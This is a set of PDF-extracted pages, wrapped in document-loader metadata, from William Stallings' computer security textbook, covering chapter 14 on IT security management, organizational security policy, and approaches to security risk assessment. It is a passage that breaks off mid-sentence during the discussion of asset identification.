       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 483, 'page_label': '482'}, page_content='482  CHAPTER 14 / IT SECURITY MANAGEMENT ANd\\xa0RISk ASSESSMENT\\nStandards Organization (ISO) has revised and consolidated a number of these \\n standards into the ISO 27000 series. Table 14.1 details a number of recently adopted \\nstandards within this family. In the United States, NIST has also produced a number \\nof relevant standards, including NIST SP 800-18 ( Guide for Developing Security \\nPlans for Federal Information Systems , February 2006), NIST SP 800-30 ( Guide \\nfor Conducting Risk Assessments , September 2012), and NIST SP 800-53 ( Security \\nand Privacy Controls for Federal Information Systems and Organizations , January \\n2015). NIST also released the “ Framework for Improving Critical Infrastructure \\n Cybersecurity” in 2014, to provide guidance to organizations on systematically man-\\naging cybersecurity risks. With the growth of concerns about corporate governance \\nfollowing events such as the global financial crisis and repeated incidences of the \\nloss of personal information by government organizations and other businesses, \\nauditors for such organizations increasingly require adherence to formal standards \\nsuch as these.\\nFor our purposes, we can define IT security management as follows:\\n27000:2016 “Information security management systems—Overview and vocabulary”  provides an \\n overview of information security management systems, and defines the  vocabulary and \\n definitions used in the 27000 family of standards.\\n27001:2013 “Information security management systems—Requirements” specifies the  requirements for \\nestablishing, implementing, operating, monitoring, reviewing, maintaining, and improving a \\ndocumented Information Security Management System.\\n27002:2013 “Code of practice for information security management” provides guidelines for information \\nsecurity management in an organization and contains a list of best-practice security controls. \\nIt was formerly known as ISO17799.\\n27003:2010 “Information security management system implementation guidance” details the process \\nfrom inception to the production of implementation plans of an Information Security \\n Management System specification and design.\\n27004:2009 “Information security management—Measurement” provides guidance to help organizations \\nmeasure and report on the effectiveness of their Information Security Management System \\nprocesses and controls.\\n27005:2011 “Information security risk management” provides guidelines on the information security risk \\nmanagement process. It supersedes ISO13335-3/4.\\n27006:2015 “Requirements for bodies providing audit and certification of information security \\n management systems” specifies requirements and provides guidance for these bodies.\\nTable 14.1 ISO/IEC 27000 Series of Standards on IT Security Techniques\\nIT SECURITY MANAGEMENT: The formal process used to develop and \\nmaintain appropriate levels of computer security for an organization’s assets, by \\npreserving their confidentiality, integrity, availability, accountability, authenticity, \\nand reliability. The steps in the IT security management process include:\\n• determining the organization’s IT security objectives, strategies, and policies.\\n• performing an IT security risk assessment that analyzes security threats to \\nIT assets within the organization, and determines the resulting risks.\\n• selecting suitable controls to cost effectively protect the organization’s IT \\nassets.\\nM14_STAL0611_04_GE_C14.indd   482 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 484, 'page_label': '483'}, page_content='14.1 / IT SECURITY MANAGEMENT  483\\nFigure 14.1 Overview of IT Security Management\\nIT security policy\\n Organizational\\ncontext\\nSecurity risk analysis\\nRisk analysis options\\nBaseline Informal Formal\\nSelection of controls\\nImplement\\ncontrols\\nSecurity awareness\\nand training\\nDevelopment of security plan\\nand procedures\\nMaintenance Security\\ncompliance\\nIncident\\nhandling\\nChange\\nmanagement\\nImplementation\\nFollow-up\\nCombined\\n• writing plans and procedures to effectively implement the selected controls.\\n• implementing the selected controls, including provision of a security aware-\\nness and training program.\\n• monitoring the operation, and maintaining the effectiveness, of the selected \\ncontrols.\\n• detecting and reacting to incidents.\\nThis process is illustrated in Figure 14.1 (adapted from figure 1 in ISO 27005 (Informa-\\ntion security risk management, 2011) and figure 1 in part 3 of ISO 13335 (Management \\nof information and communications technology security, 2004)), with a particular focus \\non the internal details relating to the risk assessment process. IT security manage -\\nment needs to be a key part of an organization’s overall management plan. Similarly, \\nthe IT security risk assessment process should be incorporated into the wider risk \\nM14_STAL0611_04_GE_C14.indd   483 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 485, 'page_label': '484'}, page_content='484  CHAPTER 14 / IT SECURITY MANAGEMENT ANd\\xa0RISk ASSESSMENT\\nFigure 14.2 The Plan-Do-Check-Act Process Model\\nAct\\nDo\\nPlan\\nInterested\\nparties\\nInformation\\nsecurity\\nneeds\\nCheck\\nInterested\\nparties\\nManaged\\nsecurity\\nassessment of all the organization’s assets and business processes. Hence, unless senior \\nmanagement in an organization are aware of, and support, this process, it is unlikely \\nthat the desired security objectives will be met and contribute appropriately to the \\norganization’s business outcomes. Note that IT management is not something under-\\ntaken just once. Rather it is a cyclic process that must be repeated constantly in order \\nto keep pace with the rapid changes in both IT technology and the risk environment.\\nThe iterative nature of this process is a key focus of ISO 31000 (Risk  management\\xa0- \\nPrinciples and guidelines, 2009), and is specifically applied to the security risk man-\\nagement process in ISO 27005. This standard details a model process for managing \\ninformation security that comprises the following steps:1\\nPlan:  Establish security policy, objectives, processes, and proce-\\ndures; perform risk assessment; develop risk treatment plan \\nwith appropriate selection of controls or acceptance of risk.\\nDo: Implement the risk treatment plan.\\nCheck: Monitor and maintain the risk treatment plan.\\nAct:  Maintain and improve the information security risk man -\\nagement process in response to incidents, review, or identi-\\nfied changes.\\nThis process is illustrated in Figure 14.2, which can be aligned with Figure 14.1. \\nThe outcome of this process should be that the security needs of the interested  parties \\nare managed appropriately.\\n 14.2 ORGANIZATIONAL CONTEXT AND SECURITY POLICY\\nThe initial step in the IT security management process comprises an examination \\nof the organization’s IT security objectives, strategies, and policies in the context of \\nthe organization’s general risk profile. This can only occur in the context of the wider \\n1Adapted from table 1 in ISO 27005 and part of figure 1 in ISO 31000.\\nM14_STAL0611_04_GE_C14.indd   484 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 486, 'page_label': '485'}, page_content='14.2 / ORGANIZATIONAL CONTEXT ANd SECURITY POLICY  485\\norganizational objectives and policies, as part of the management of the organiza -\\ntion. Organizational security objectives identify what IT security outcomes should be \\nachieved. They need to address individual rights, legal requirements, and  standards \\nimposed on the organization, in support of the overall organizational objectives. \\n Organizational security strategies identify how these objectives can be met. Organiza-\\ntional security policies identify what needs to be done. These objectives, strategies, and \\npolicies need to be maintained and regularly updated based on the results of periodic \\nsecurity reviews to reflect the constantly changing technological and risk environments.\\nTo help identify these organizational security objectives, the role and impor -\\ntance of the IT systems in the organization is examined. The value of these systems \\nin assisting the organization achieve its goals is reviewed, not just the direct costs of \\nthese systems. Questions that help clarify these issues include the following:\\n• What key aspects of the organization require IT support in order to function \\nefficiently?\\n• What tasks can only be performed with IT support?\\n• Which essential decisions depend on the accuracy, currency, integrity, or avail-\\nability of data managed by the IT systems?\\n• What data cr eated, managed, processed, and stored by the IT systems need \\nprotection?\\n• What are the consequences to the organization of a security failure in their IT \\nsystems?\\nIf the answers to some of the above questions show that IT systems are important \\nto the organization in achieving its goals, then clearly the risks to them should be \\nassessed and appropriate action taken to address any deficiencies identified. A list of \\nkey organization security objectives should result from this examination.\\nOnce the objectives are listed, some broad strategy statements can be devel -\\noped. These outline in general terms how the identified objectives will be met in a \\nconsistent manner across the organization. The topics and details in the strategy state-\\nments depend on the identified objectives, the size of the organization, and the impor-\\ntance of the IT systems to the organization. The strategy statements should address \\nthe approaches the organization will use to manage the security of its IT systems.\\nGiven the organizational security objectives and strategies, an organizational \\nsecurity policy is developed that describes what the objectives and strategies are and \\nthe process used to achieve them. The organizational or corporate security policy may \\nbe either a single large document or, more commonly, a set of related documents. This \\npolicy typically needs to address at least the following topics:2\\n• The scope and purpose of the policy\\n• The relationship of the security objectives to the organization’s legal and regula-\\ntory obligations, and its business objectives\\n• IT security requirements in terms of confidentiality, integrity, availability, \\naccountability, authenticity, and reliability, particularly with regard to the views \\nof the asset owners\\n2Adapted from the details provided in various sections of ISO 13335.\\nM14_STAL0611_04_GE_C14.indd   485 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 487, 'page_label': '486'}, page_content='486  CHAPTER 14 / IT SECURITY MANAGEMENT ANd\\xa0RISk ASSESSMENT\\n• The assignment of responsibilities relating to the management of IT security \\nand the organizational infrastructure\\n• The risk management approach adopted by the organization\\n• How security awareness and training is to be handled\\n• General personnel issues, especially for those in positions of trust\\n• Any legal sanctions that may be imposed on staff, and the conditions under \\nwhich such penalties apply\\n• Integration of security into systems development and procurement\\n• Definition of the information classification scheme used across the organization\\n• Contingency and business continuity planning\\n• Incident detection and handling processes\\n• How and when this policy should be reviewed\\n• The method for controlling changes to this policy\\nThe intent of the policy is to provide a clear overview of how an organization’s IT \\ninfrastructure supports its overall business objectives in general, and more specifi -\\ncally, what security requirements must be provided in order to do this most effectively.\\nThe term security policy is also used in other contexts. Previously, an organizational \\nsecurity policy referred to a document that detailed not only the overall security objectives \\nand strategies, but also procedural policies that defined acceptable behavior, expected \\npractices, and responsibilities. RFC 2196 (Site Security Handbook, 1997) describes this form \\nof policy. This interpretation of a security policy predates the formal specification of IT \\nsecurity management as a process, as we describe in this chapter. Although the develop-\\nment of such a policy was expected to follow many of the steps we now detail as part of the \\nIT security management process, there was much less detail in its description. The content \\nof such a policy usually included many of the control areas described in standards such as \\nISO 27002, FIPS 200 and NIST SP 800-53, which we will explore further in Chapters 15–18.\\nA real-world example of such an organizational security policy, for an EU-\\nbased engineering consulting firm, is provided in the premium content section of this \\nbook’s Website (ComputerSecurityPolicy.pdf). For our purposes, we have changed \\nthe name of the company to Company wherever it appears in this document. The \\ncompany is an EU-based engineering consulting firm that specializes in the provision \\nof planning, design, and management services for infrastructure development world-\\nwide. As an illustration of the level of detail provided by this type of policy, Section\\xa01 \\nof the document SecurityPolicy.pdf, available at https://app.box.com/v/CompSec4e, \\nreproduces Section 5 of the document, covering physical and environmental security.\\nFurther guidance on requirements for a security policy is provided in online \\nSection\\xa02 of the document SecurityPolicy.pdf, which includes the specifications from \\nThe Standard of Good Practice for Information Security from the Information Secu-\\nrity Forum.\\nThe term security policy can also refer to specific security rules for specific sys-\\ntems, or to specific control procedures and processes. In the context of trusted com-\\nputing, as we will discuss in Chapter 27 , it refers to formal models for confidentiality \\nand integrity. In this chapter though, we use the term to refer to the description of \\nthe overall security objectives and strategies, as described at the start of this section.\\nM14_STAL0611_04_GE_C14.indd   486 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 488, 'page_label': '487'}, page_content='14.3 / SECURITY RISk ASSESSMENT  487\\nIt is critical that an organization’s IT security policy has full approval and buy-in \\nby senior management. Without this, experience shows that it is unlikely that suf -\\nficient resources or emphasis will be given to meeting the identified objectives and \\nachieving a suitable security outcome. With the clear, visible support of senior man-\\nagement, it is much more likely that security will be taken seriously by all levels \\nof personnel in the organization. This support is also evidence of concern and due \\ndiligence in the management of the organization’s systems and the monitoring of its \\nrisk profile.\\nBecause the responsibility for IT security is shared across the organization, there \\nis a risk of inconsistent implementation of security and a loss of central monitoring \\nand control. The various standards strongly recommend that overall responsibility \\nfor the organization’s IT security be assigned to a single person, the organizational \\nIT security officer. This person should ideally have a background in IT security. The \\nresponsibilities of this person include:\\n• Oversight of the IT security management process.\\n• Liaison with senior management on IT security issues.\\n• Maintenance of the organization’s IT security objectives, strategies, and policies.\\n• Coordination of the response to any IT security incidents.\\n• Management of the organization-wide IT security awareness and training programs.\\n• Interaction with IT project security officers.\\nLarger organizations will need separate IT project security officers associated with \\nmajor projects and systems. Their role is to develop and maintain security policies for \\ntheir systems, develop and implement security plans relating to these systems, handle \\nthe day-to-day monitoring of the implementation of these plans, and assist with the \\ninvestigation of incidents involving their systems.\\n 14.3 SECURITY RISK ASSESSMENT\\nWe now turn to the key risk management component of the IT security process. \\nThis stage is critical, because without it there is a significant chance that resources \\nwill not be deployed where most effective. The result will be that some risks are \\nnot addressed, leaving the organization vulnerable, while other safeguards may be \\ndeployed without sufficient justification, wasting time and money. Ideally, every single \\norganizational asset is examined, and every conceivable risk to it is evaluated. If a risk \\nis judged to be too great, then appropriate remedial controls are deployed to reduce \\nthe risk to an acceptable level. In practice, this is clearly impossible. The time and \\neffort required, even for large, well-resourced organizations, is clearly  neither achiev-\\nable nor cost effective. Even if possible, the rapid rate of change in both IT technolo-\\ngies and the wider threat environment means that any such assessment would be \\nobsolete as soon as it is completed, if not earlier! Clearly some form of compromise \\nevaluation is needed.\\nAnother issue is the decision as to what constitutes an appropriate level of \\nrisk to accept. In an ideal world, the goal would be to eliminate all risks completely. \\nM14_STAL0611_04_GE_C14.indd   487 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 489, 'page_label': '488'}, page_content='488  CHAPTER 14 / IT SECURITY MANAGEMENT ANd\\xa0RISk ASSESSMENT\\nAgain, this is simply not possible. A more realistic alternative is to expend an amount \\nof resources in reducing risks proportional to the potential costs to the organization \\nshould that risk occur. This process also must take into consideration the likelihood \\nof the risk’s occurrence. Specifying the acceptable level of risk is simply prudent \\nmanagement and means that resources expended are reasonable in the context of \\nthe organization’s available budget, time, and personnel resources. The aim of the \\nrisk assessment process is to provide management with the information necessary for \\nthem to make reasonable decisions on where available resources will be deployed.\\nGiven the wide range of organizations, from very small businesses to global \\nmultinationals and national governments, there clearly needs to be a range of alterna-\\ntives available in performing this process. There are a range of formal standards that \\ndetail suitable IT security risk assessment processes, including ISO 13335, ISO 27005, \\nISO 31000, and NIST SP 800-30. In particular, ISO 13335 recognizes four approaches \\nto identifying and mitigating risks to an organization’s IT infrastructure:\\n• Baseline approach\\n• Informal approach\\n• Detailed risk analysis\\n• Combined approach\\nThe choice among these will be determined by the resources available to the organi-\\nzation and from an initial high-level risk analysis that considers how valuable the IT \\nsystems are and how critical to the organization’s business objectives. Legal and regula-\\ntory constraints may also require specific approaches. This information should be deter-\\nmined when developing the organization’s IT security objectives, strategies, and policies.\\nBaseline Approach\\nThe baseline approach to risk assessment aims to implement a basic general level \\nof security controls on systems using baseline documents, codes of practice, and \\n industry best practice. The advantages of this approach are that it does not require the \\n expenditure of additional resources in conducting a more formal risk assessment and \\nthat the same measures can be replicated over a range of systems. The major disad-\\nvantage is that no special consideration is given to variations in the organization’s risk \\nexposure based on who they are and how their systems are used. In additional, there \\nis a chance that the baseline level may be set either too high, leading to expensive or \\nrestrictive security measures that may not be warranted, or set too low, resulting in \\ninsufficient security and leaving the organization vulnerable.\\nThe goal of the baseline approach is to implement generally agreed controls to \\nprovide protection against the most common threats. These would include implementing \\nindustry best practice in configuring and deploying systems, like those we discussed, in \\nChapter 12 on operating systems security. As such, the baseline approach forms a good \\nbase from which further security measures can be determined. Suitable baseline recom-\\nmendations and checklists may be obtained from a range of organizations, including:\\n• Various national and international standards organizations\\n• Security-related organizations such as the CERT, NSA, and so on\\n• Industry sector councils or peak groups\\nM14_STAL0611_04_GE_C14.indd   488 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 490, 'page_label': '489'}, page_content='14.3 / SECURITY RISk ASSESSMENT  489\\nThe use of the baseline approach alone would generally be recommended only for \\nsmall organizations without the resources to implement more structured approaches. \\nBut it will at least ensure that a basic level of security is deployed, which is not guar-\\nanteed by the default configurations of many systems.\\nInformal Approach\\nThe informal approach involves conducting some form of informal, pragmatic risk \\nanalysis for the organization’s IT systems. This analysis does not involve the use \\nof a formal, structured process, but rather exploits the knowledge and expertise of \\nthe individuals performing this analysis. These may either be internal experts, if \\navailable, or alternatively, external consultants. A major advantage of this approach \\nis that the individuals performing the analysis require no additional skills. Hence, \\nan informal risk assessment can be performed relatively quickly and cheaply. In \\naddition, because the organization’s systems are being examined, judgments can \\nbe made about specific vulnerabilities and risks to systems for the organization \\nthat the baseline approach would not address. Thus, more accurate and targeted \\ncontrols may be used than would be the case with the baseline approach. There are \\na number of disadvantages. Because a formal process is not used, there is a chance \\nthat some risks may not be considered appropriately, potentially leaving the orga -\\nnization vulnerable. Besides, because the approach is informal, the results may be \\nskewed by the views and prejudices of the individuals performing the analysis. It \\nmay also result in insufficient justification for suggested controls, leading to ques -\\ntions over whether the proposed expenditure is really justified. Lastly, there may be \\ninconsistent results over time as a result of differing expertise in those conducting \\nthe analysis.\\nThe use of the informal approach would generally be recommended for small \\nto medium-sized organizations where the IT systems are not necessarily essential to \\nmeeting the organization’s business objectives, and where additional expenditure on \\nrisk analysis cannot be justified.\\nDetailed Risk Analysis\\nThe third and most comprehensive approach is to conduct a detailed risk assess -\\nment of the organization’s IT systems, using a formal structured process. This pro -\\nvides the greatest degree of assurance that all significant risks are identified and \\ntheir implications considered. This process involves a number of stages, including \\nidentification of assets, identification of threats and vulnerabilities to those assets, \\ndetermination of the likelihood of the risk occurring and the consequences to the \\norganization should that occur, and hence the risk to which the organization is \\nexposed. With that information, appropriate controls can be chosen and imple -\\nmented to address the risks identified. The advantages of this approach are that it \\nprovides the most detailed examination of the security risks of an organization’s IT \\nsystem, and produces strong justification for expenditure on the controls proposed. \\nIt also provides the best information for continuing to manage the security of these \\nsystems as they evolve and change. The major disadvantage is the significant cost in \\ntime, resources, and expertise needed to perform such an analysis. The time taken \\nto perform this analysis may also result in delays in providing suitable levels of \\nM14_STAL0611_04_GE_C14.indd   489 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 491, 'page_label': '490'}, page_content='490  CHAPTER 14 / IT SECURITY MANAGEMENT ANd\\xa0RISk ASSESSMENT\\nprotection for some systems. The details of this approach will be discussed in the \\nnext section.\\nThe use of a formal, detailed risk analysis is often a legal requirement for some \\ngovernment organizations and businesses providing key services to them. This may \\nalso be the case for organizations providing key national infrastructure. For such \\norganizations, there is no choice but to use this approach. It may also be the approach \\nof choice for large organizations with IT systems critical to their business objectives \\nand with the resources available to perform this type of analysis.\\nCombined Approach\\nThe last approach combines elements of the baseline, informal, and detailed risk \\nanalysis approaches. The aim is to provide reasonable levels of protection as \\nquickly as possible then to examine and adjust the protection controls deployed \\non key systems over time. The approach starts with the implementation of suitable \\nbaseline security recommendations on all systems. Next, systems either exposed \\nto high risk levels or critical to the organization’s business objectives are identi -\\nfied in the high-level risk assessment. A decision can then be made to possibly \\nconduct an immediate informal risk assessment on key systems, with the aim of \\nrelatively quickly tailoring controls to more accurately reflect their requirements. \\nLastly, an ordered process of performing detailed risk analyses of these systems can \\nbe instituted. Over time, this can result in the most appropriate and cost-effective \\nsecurity controls being selected and implemented on these systems. This approach \\nhas a significant number of advantages. The use of the initial high-level analysis \\nto determine where further resources need to be expended, rather than facing \\na full detailed risk analysis of all systems, may well be easier to sell to manage -\\nment. It also results in the development of a strategic picture of the IT resources \\nand where major risks are likely to occur. This provides a key planning aid in the \\nsubsequent management of the organization’s security. The use of the baseline and \\ninformal analyses ensures that a basic level of security protection is implemented \\nearly. Resources are likely to be applied where most needed, and systems most at \\nrisk are likely to be examined further reasonably early in the process. However, \\nthere are some disadvantages. If the initial high-level analysis is inaccurate, then \\nsome systems for which a detailed risk analysis should be performed may remain \\nvulnerable for some time. Nonetheless, the use of the baseline approach should \\nensure a basic minimum security level on such systems. Further, if the results of \\nthe high-level analysis are reviewed appropriately, the chance of lingering vulner -\\nability is minimized.\\nISO 13335 considers that for most organizations, in most circumstances, this \\napproach is the most cost effective. Consequently, its use is highly recommended.\\n 14.4 DETAILED SECURITY RISK ANALYSIS\\nThe formal, detailed security risk analysis approach provides the most accurate \\n evaluation of an organization’s IT system’s security risks, but at the highest cost. This \\napproach has evolved with the development of trusted computer systems, initially \\nM14_STAL0611_04_GE_C14.indd   490 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 492, 'page_label': '491'}, page_content='14.4 / dETAILEd SECURITY RISk ANALYSIS  491\\nfocused on addressing defense security concerns, as we will discuss in  Chapter\\xa027. \\nThe\\xa0original security risk assessment methodology was given in the Yellow Book \\nstandard (CSC-STD-004-85 June 1985), one of the original U.S. TCSEC rainbow \\nbook series of standards. Its focus was entirely on protecting the confidentiality of \\ninformation, reflecting the military concern with information classification. The rec-\\nommended rating it gave for a trusted computer system depended on the difference \\nbetween the minimum user clearance and the maximum information classification. \\nSpecifically it defined a risk index as\\nRisk Index = Max Info Sensitivity - Min User Clearance\\nA table in this standard, listing suitable categories of systems for each risk level, \\nwas used to select the system type. Clearly, this limited approach neither adequately \\nreflects the range of security services required nor the wide range of possible threats. \\nOver the years since, the process of conducting a security risk assessment that does \\nconsider these issues has evolved.\\nA number of national and international standards document the expected for-\\nmal risk analysis approach. These include ISO 27005, ISO 31000, NIST SP 800-30,  \\nand [SASN13]. This approach is often mandated by government organizations \\nand associated businesses. These standards all broadly agree on the process used. \\nFigure 14.3 (reproduced from figure 5 in NIST SP 800-30) illustrates a typical \\nprocess used.\\nFigure 14.3 Risk Assessment Process\\nStep 2: Conduct risk analysis\\nIdentify threat sources and events\\nIdentify vulnerabilities and\\npredisposing conditions\\nDetermine likelihood of occurence\\nDetermine magnitude of impact\\nDetermine risk\\nStep 1: Prepare for assessment\\nStep 4: Maintain assessment\\nStep 3: Communicate results\\nDerived from organizational aspects\\nM14_STAL0611_04_GE_C14.indd   491 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 493, 'page_label': '492'}, page_content='492  CHAPTER 14 / IT SECURITY MANAGEMENT ANd\\xa0RISk ASSESSMENT\\nContext and System Characterization\\nThe initial step is known as establishing the context  or system characterization . Its \\npurpose is to determine the basic parameters within which the risk assessment will \\nbe conducted, and then to identify the assets to be examined.\\nEstablishing thE ContExt The process starts with the organizational security \\nobjectives and considers the broad risk exposure of the organization. This recognizes \\nthat not all organizations are equally at risk, but some, because of their function, may \\nbe specifically targeted. It explores the relationship between a specific organization \\nand the wider political and social environment in which it operates. Figure 14.4 \\n(adapted from an IDC 2000 report) suggests a possible spectrum of organizational \\nrisk. Industries such as agriculture and education are considered to be at lesser risk \\ncompared to government or banking and finance. Note this classification predates \\nSeptember 11, and it is likely that there has been change since it was developed. In \\nparticular, utilities, for example, are probably at higher risk than the classification \\nsuggests. NIST has indicated3 that the following industries are vulnerable to risks in \\nSupervisory Control and Data Acquisition (SCADA) and process control systems: \\nelectric, water and wastewater, oil and natural gas, transportation, chemical, pharma-\\nceutical, pulp and paper, food and beverage, and discrete manufacturing (automotive, \\naerospace, and durable goods), air and rail transportation, and mining and \\nmetallurgy.\\nAt this point in determining an organization’s broad risk exposure, any relevant \\nlegal and regulatory constraints must also be identified. These features provide a \\nbaseline for the organization’s risk exposure and an initial indication of the broad \\nscale of resources it needs to expend to manage this risk in order to successfully \\nconduct business.\\n3Adapted from the Executive Summary of NIST SP 800-82 ( Guide to Industrial Control Systems (ICS) \\nSecurity, May 2015).\\nFigure 14.4 Generic Organizational Risk Context\\nCommunications\\nEducation Manufacturing Government\\nMedia Utilities Banking and\\nﬁnance\\nRetail Health care\\nTransportationAgriculture\\nConstruction\\nMore vulnerableLess vulnerable\\nM14_STAL0611_04_GE_C14.indd   492 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 494, 'page_label': '493'}, page_content='14.4 / dETAILEd SECURITY RISk ANALYSIS  493\\nNext, senior management must define the organization’s risk appetite, the level \\nof risk the organization views as acceptable. Again, this will depend very much on \\nthe type of organization, and its management’s attitude to how it conducts busi -\\nness. For example, banking and finance organizations tend to be fairly conservative \\nand risk averse. This means they want a low residual risk and are willing to spend \\nthe resources necessary to achieve this. By contrast, a leading-edge manufacturer \\nwith a brand new product may have a much greater risk tolerance. The manufac -\\nturer is willing to take a chance to obtain a competitive advantage, and with limited \\nresources wishes to expend less on risk controls. This decision is not just IT specific. \\nRather, it reflects the organization’s broader management approach to how it con -\\nducts business.\\nThe boundaries of this risk assessment are then identified. This may range \\nfrom just a single system or aspect of the organization to its entire IT infrastructure. \\nThis will depend in part on the risk assessment approach being used. A combined \\napproach requires separate assessments of critical components over time as the secu-\\nrity profile of the organization evolves. It also recognizes that not all systems may be \\nunder control of the organization. In particular, if services or systems are provided \\nexternally, they may need to be considered separately. The various stakeholders in the \\nprocess also need to be identified, and a decision must be made as to who conducts \\nand monitors the risk assessment process for the organization. Resources must be \\nallocated for the process. This all requires support from senior management, whose \\ncommitment is critical for the successful completion of the process.\\nA decision also needs to be made as to precisely which risk assessment criteria \\nwill be used in this process. While there is broad general agreement on this process, \\nthe actual details and tables used vary considerably and are still evolving. This deci-\\nsion may be determined by what has been used previously in this, or related, orga -\\nnizations. For government organizations, this decision may be specified by law or \\nregulation. Lastly, the knowledge and experience of those performing the analysis \\nmay determine the criteria used.\\nassEt idEntifiCation The last component of this first step in the risk assessment \\nis to identify the assets to examine . This directly addresses the first of the three \\nfundamental questions we opened this chapter with: “What assets do we need to \\nprotect?” An asset is “anything that needs to be protected” because it has value \\nto the organization and contributes to the successful attainment of the organiza -\\ntion’s objectives. As we discussed in Chapter 1, an asset may be either tangible \\nor intangible. It includes computer and communications hardware infrastructure, \\nsoftware (including applications and information/data held on these systems), the \\ndocumentation on these systems, and the people who manage and maintain these \\nsystems. Within the boundaries identified for the risk assessment, these assets need \\nto be identified and their value to the organization assessed. It is important to \\nemphasize again that while the ideal is to consider every conceivable asset, in prac -\\ntice this is not possible. Rather the goal here is to identify all assets that contribute \\nsignificantly to attaining the organization’s objectives and whose compromise or 